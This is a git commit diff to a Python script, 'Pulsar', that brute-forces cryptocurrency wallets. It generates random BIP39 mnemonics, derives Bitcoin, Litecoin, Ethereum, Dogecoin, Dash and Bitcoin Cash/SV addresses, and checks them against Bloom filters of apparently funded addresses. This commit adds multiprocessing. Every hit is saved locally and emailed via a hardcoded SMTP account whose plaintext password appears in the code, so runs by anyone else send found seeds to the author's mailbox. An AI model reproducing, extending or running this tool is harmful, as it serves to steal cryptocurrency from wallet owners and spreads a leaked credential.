173e180fa81c36a06aa75ea88dba98e4a48d0976
Noname400 <74019756+Noname400@users.noreply.github.com>
2021-06-04 19:33:46 +0300

    Add files via upload

--- mainMT.py
+++ mainMT.py
@@ -1,39 +1,79 @@
 # #!/usr/bin/python3
 # encoding=utf8
 # -*- coding: utf-8 -*-
+import multiprocessing
+from multiprocessing import freeze_support
 import smtplib
 from bip_utils import Bip32, Bip32Utils, Bip44, Bip44Coins, Bip44Changes
 from bloomfilter import BloomFilter
 from mnemonic import Mnemonic
-import sys
-import argparse
+import sys, os
 import time
+from colorama import init, Fore, Back, Style
+init()
 
 
-version:str = ' Pulsar v2.9 '
-mnemonic_lang = ['english', 'chinese_simplified', 'chinese_traditional', 'french', 'italian', 'spanish']
-fl_44:list = ['ltc.bf','dash.bf','eth.bf','doge.bf','cash.bf','sv.bf','btc.bf']
-fl_32:list = ['btc.bf']
+class email:
+    host:str = 'smtp.timeweb.ru'
+    port:int = 25
+    password:str = 'Vfhbyfl66$'
+    subject:str = '--- Find Mnemonic ---'
+    to_addr:str = 'info@quadrotech.ru'
+    from_addr:str = 'info@quadrotech.ru'
 
 
-def createParser ():
-    parser = argparse.ArgumentParser(description='select bip')
-    parser.add_argument ('-b', '--bip', action='store', type=int, help='32 or 44, default bip32', default='32')
-    parser.add_argument ('-d', '--dir_bf', action='store', type=str, help='directories to BF', default='bf')
-    return parser.parse_args().bip, parser.parse_args().dir_bf
+class inf:
+    version:str = ' Pulsar v3.0 multiT '
+    mnemonic_lang = ['english', 'chinese_simplified', 'chinese_traditional', 'french', 'italian', 'spanish']
+    #fl_44:list = ['ltc.bf','dash.bf','eth.bf','doge.bf','cash.bf','sv.bf','btc.bf']
+    #fl_32:list = ['btc.bf']
+    count_32:int = 720
+    count_44:int = 840
+    process_count_work:int = 1 #количество процессов
+    type_bip:int = 32
+    dir_bf:str = ''
+    process_time_work = 0.0
+    total_key = 0
+
+
+def load_BF(bf_file):
+    global bf_ltc
+    global bf_dash
+    global bf_eth
+    global bf_doge
+    global bf_cash
+    global bf_sv
+    global bf_btc
+    try:
+        fp = open(inf.dir_bf+'\\'+bf_file, 'rb')
+    except FileNotFoundError:
+        print('\n'+'File: '+ fl + ' не найден.')
+        sys.exit()
+    else:
+        if bf_file == 'ltc.bf':
+            bf_ltc = BloomFilter.load(fp)
+        if bf_file == 'dash.bf':
+            bf_dash = BloomFilter.load(fp)
+        if bf_file == 'eth.bf':
+            bf_eth = BloomFilter.load(fp)
+        if bf_file == 'doge.bf':
+            bf_doge = BloomFilter.load(fp)
+        if bf_file == 'cash.bf':
+            bf_cash = BloomFilter.load(fp)
+        if bf_file == 'sv.bf':
+            bf_sv = BloomFilter.load(fp)
+        if bf_file == 'btc.bf':
+            bf_btc = BloomFilter.load(fp)
+        print('Bloom Filter '+bf_file+' Loaded')
+
 
 
 def send_email(text):
-    host:str = "smtp.timeweb.ru"
-    password:str = 'Vfhbyfl66$'
-    subject:str = "--- Find Mnemonic ---"
-    to_addr:str = "info@quadrotech.ru"
-    from_addr:str = "info@quadrotech.ru"
-    BODY:str = "\r\n".join(("From: %s" % from_addr, "To: %s" % to_addr, "Subject: %s" % subject, "", text)).encode('utf-8')
-    server = smtplib.SMTP(host,25)
-    server.login(from_addr, password)
+    BODY:str = '\r\n'.join(('From: %s' % email.from_addr, 'To: %s' % email.to_addr, 'Subject: %s' % email.subject, '', text)).encode('utf-8')
+    server = smtplib.SMTP(email.host,email.port)
+    server.login(email.from_addr, email.password)
     try:
-        server.sendmail(from_addr, [to_addr], BODY)
+        server.sendmail(email.from_addr, email.to_addr, BODY)
     except UnicodeError:
         print('\n'+'Error Encode UTF-8')
     finally:
@@ -42,7 +82,7 @@ def send_email(text):
 
 def save_rezult(text:str):
     try:
-        f_rez = open('rezult.txt', 'a', encoding="utf-8")
+        f_rez = open('rezult.txt', 'a', encoding='utf-8')
     except FileNotFoundError:
         print('\n'+'Файл rezult.txt не найден.')
     else:
@@ -55,13 +95,13 @@ def save_rezult(text:str):
             f_rez.close()
 
 
-def work32():
-    for mem in mnemonic_lang:
+def work32(bf_btc):
+    for mem in inf.mnemonic_lang:
         mnemo = Mnemonic(mem)
         mnemonic:str = mnemo.generate(strength=128)
-        seed_bytes:bytes = mnemo.to_seed(mnemonic, passphrase="")
+        seed_bytes:bytes = mnemo.to_seed(mnemonic, passphrase='')
         bip32_ctx = Bip32.FromSeed(seed_bytes)
-
+        #----------------------------------------------------------------
         for num in range(20):
             bip32_ctx_ex = bip32_ctx.DerivePath("0'/0'/" + str(num))  # Bitcoin Core address primary m/0'/0'/0
             bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
@@ -72,7 +112,7 @@ def work32():
                 print(res)
                 save_rezult(res)
                 send_email(res)
-        # print("------------------------------------------------------")
+        #----------------------------------------------------------------
         for num in range(20):
             bip32_ctx_ex = bip32_ctx.DerivePath("0'/0'/" + str(num) + "'")  # Bitcoin Core hardened addresses primary m/0'/0'/0'
             bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
@@ -83,7 +123,7 @@ def work32():
                 print(res)
                 save_rezult(res)
                 send_email(res)
-        # print("------------------------------------------------------")
+        #----------------------------------------------------------------
         for num in range(20):
             bip32_ctx_ex = bip32_ctx.DerivePath("0'/0/" + str(num))  # Miltibit HD address
             bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
@@ -94,7 +134,7 @@ def work32():
                 print(res)
                 save_rezult(res)
                 send_email(res)
-        # print("------------------------------------------------------")
+        #----------------------------------------------------------------
         for num in range(20):
             bip32_ctx_ex = bip32_ctx.DerivePath("0'/0/" + str(num) + "'")  # Miltibit HD address
             bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
@@ -105,7 +145,7 @@ def work32():
                 print(res)
                 save_rezult(res)
                 send_email(res)
-        # print("------------------------------------------------------")
+        #----------------------------------------------------------------
         for num in range(20):
             bip32_ctx_ex = bip32_ctx.DerivePath("0/" + str(num))  # Miltibit HD hardened addresses
             bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
@@ -116,7 +156,7 @@ def work32():
                 print(res)
                 save_rezult(res)
                 send_email(res)
-            # print("------------------------------------------------------")
+        #----------------------------------------------------------------
         for num in range(20):
             bip32_ctx_ex = bip32_ctx.DerivePath("44'/0'/0'/" + str(num))  # Miltibit HD hardened addresses
             bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
@@ -127,10 +167,11 @@ def work32():
                 print(res)
                 save_rezult(res)
                 send_email(res)
-            # print("------------------------------------------------------")
+        #----------------------------------------------------------------
 
-def work44():
-    for mem in mnemonic_lang:
+
+def work44(bf_ltc,bf_dash,bf_eth,bf_doge,bf_cash,bf_sv,bf_btc):
+    for mem in inf.mnemonic_lang:
         mnemo = Mnemonic(mem)
         mnemonic:str = mnemo.generate(strength=128)
         seed_bytes:bytes = mnemo.to_seed(mnemonic, passphrase="")
@@ -239,75 +280,90 @@ def work44():
                 save_rezult(res)
                 send_email(res)
 
+
+def run32(bf_btc):
+    ind:int = 1
+    while ind > 0:
+        start_time = time.time()
+        work32(bf_btc)
+        inf.total_key += inf.count_32
+        inf.process_time_work = time.time() - start_time
+        print(Fore.YELLOW+'cycle: {:d} | total key: {:d} | key/s: {:d} in process {:s}'.format(ind, inf.total_key, int(inf.count_32/inf.process_time_work), multiprocessing.current_process().name),flush=True)
+        ind +=1
+
+
+def run44(bf_ltc,bf_dash,bf_eth,bf_doge,bf_cash,bf_sv,bf_btc):
+    ind:int = 1
+    while ind > 0:
+        start_time = time.time()
+        work44(bf_ltc,bf_dash,bf_eth,bf_doge,bf_cash,bf_sv,bf_btc)
+        inf.total_key += inf.count_44
+        inf.process_time_work = time.time() - start_time
+        print(Fore.YELLOW+'[*] cycle: {} | total key: {} | key/s: {:d} in process {:s}'.format(ind, inf.total_key, int(inf.count_44/inf.process_time_work), multiprocessing.current_process().name),flush=True)
+        #print(Fore.YELLOW+'name process: {} | cycle: {} | total key: {} | key/s: {:f}'.format(multiprocessing.current_process().name, ind, inf.count_44*(ind), inf.process_time_work),flush=True)
+        ind +=1
+
 if __name__ == "__main__":
-    bip, dir = createParser()
-    if bip == 32:
-        print("---------------Load BF---------------")
-        for fl in fl_32:
-            try:
-                fp = open(dir+'/'+fl, "rb")
-            except FileNotFoundError:
-                print('\n'+'File '+ fl + ' не найден.')
-                sys.exit()
-            else:
-                if fl == 'btc.bf':
-                    bf_btc = BloomFilter.load(fp)
-                    print('load BF '+fl)
-
-        ii:int = 1
-        count_32 = 720
-        print("---------------START "+version+"---------------")
-        while ii > 0:
-            ii +=1
-            try:
-                start_time = time.time()
-                work32()
-                ee= time.time() - start_time
-                print('cycle: {} | total key: {} | key/s: {:d}'.format(ii, count_32*(ii), int(count_32/ee)),end='\r')
-            except KeyboardInterrupt:
-                print('\n'+'Прервано пользователем.')
-                sys.exit()
+    freeze_support()
+    print('* Version: {} '.format(inf   .version))
+    if len (sys.argv) == 4:
+        inf.type_bip:int = int(sys.argv[1])
+        inf.dir_bf:str = os.getcwd()+'\\'+sys.argv[2]
+        inf.process_count_work:int = int(sys.argv[3])
+        print('* Total kernel of CPU: {} '.format(multiprocessing.cpu_count()))
+        print('* Used kernel: {}'.format(inf.process_count_work))
+        print('* Mode Search: BIP-{}'.format (inf.type_bip))
+        print('* Dir database Bloom Filter: {}'.format (inf.dir_bf))
     else:
-        print("---------------Load BF---------------")
-        for fl in fl_44:
-            try:
-                fp = open(dir+'/'+fl, "rb")
-            except FileNotFoundError:
-                print('\n'+'File '+ fl + ' не найден.')
-                sys.exit()
-            else:
-                if fl == 'ltc.bf':
-                    bf_ltc = BloomFilter.load(fp)
-                    print('load BF '+fl)
-                if fl == 'dash.bf':
-                    bf_dash = BloomFilter.load(fp)
-                    print('load BF '+fl)
-                if fl == 'eth.bf':
-                    bf_eth = BloomFilter.load(fp)
-                    print('load BF '+fl)
-                if fl == 'doge.bf':
-                    bf_doge = BloomFilter.load(fp)
-                    print('load BF '+fl)
-                if fl == 'cash.bf':
-                    bf_cash = BloomFilter.load(fp)
-                    print('load BF '+fl)
-                if fl == 'sv.bf':
-                    bf_sv = BloomFilter.load(fp)
-                    print('load BF '+fl)
-                if fl == 'btc.bf':
-                    bf_btc = BloomFilter.load(fp)
-                    print('load BF '+fl)
+        print ("Не хватает параметров.")
+        sys.exit()
+    if inf.process_count_work < 1:
+        print('количество процессов должно быть больше 0')
+        sys.exit()
+    if inf.process_count_work > multiprocessing.cpu_count():
+        print('Указаное количество процессов превышает допустимое')
+        print('ИСПРАВЛЕНО на допустимое количество процессов')
+        inf.process_count_work = multiprocessing.cpu_count()
 
-        ii:int = 1
-        count_44 = 840
-        print("---------------START "+version+"---------------")
-        while ii > 0:
-            try:
-                start_time = time.time()
-                work44()
-                ee= time.time() - start_time
-                print('cycle: {} | total key: {} | key/s: {:d}'.format(ii, count_44*(ii), int(count_44/ee)),end='\r')
-                ii +=1
-            except KeyboardInterrupt:
-                print('\n'+'Прервано пользователем.')
-                sys.exit()
+    if inf.type_bip == 32:
+        print('---------------Load BF---------------')
+        load_BF('btc.bf')
+        procs = []
+        try:
+            for index in range(inf.process_count_work):
+                #proc = multiprocessing.Process(target=work32, name= 'cpu'+str(index),args = (bf_btc, ))
+                proc = multiprocessing.Process(target=run32, name= 'cpu'+str(index), args = (bf_btc, ))
+                procs.append(proc)
+                proc.start()
+            for proc in procs:
+                proc.join()
+        except KeyboardInterrupt:
+            print('\n'+'Прервано пользователем.')
+            for proc in procs:
+                proc.terminate()
+            sys.exit()
+#--------------------------------------------------
+    if inf.type_bip == 44:
+        print('---------------Load BF---------------')
+        load_BF('ltc.bf')
+        load_BF('dash.bf')
+        load_BF('eth.bf')
+        load_BF('doge.bf')
+        load_BF('cash.bf')
+        load_BF('sv.bf')
+        load_BF('btc.bf')
+        procs = []
+        try:
+            for index in range(inf.process_count_work):
+                #proc = multiprocessing.Process(target=work32, name= 'cpu'+str(index),args = (bf_btc, ))
+                proc = multiprocessing.Process(target=run44, name= 'cpu'+str(index), args = (bf_ltc,bf_dash,bf_eth,bf_doge,bf_cash,bf_sv,bf_btc,))
+                procs.append(proc)
+                proc.start()
+            for proc in procs:
+                proc.join()
+        except KeyboardInterrupt:
+            print('\n'+'Прервано пользователем.')
+            for proc in procs:
+                proc.terminate()
+            sys.exit()
+    print('\n'+'Программа завершила работу')
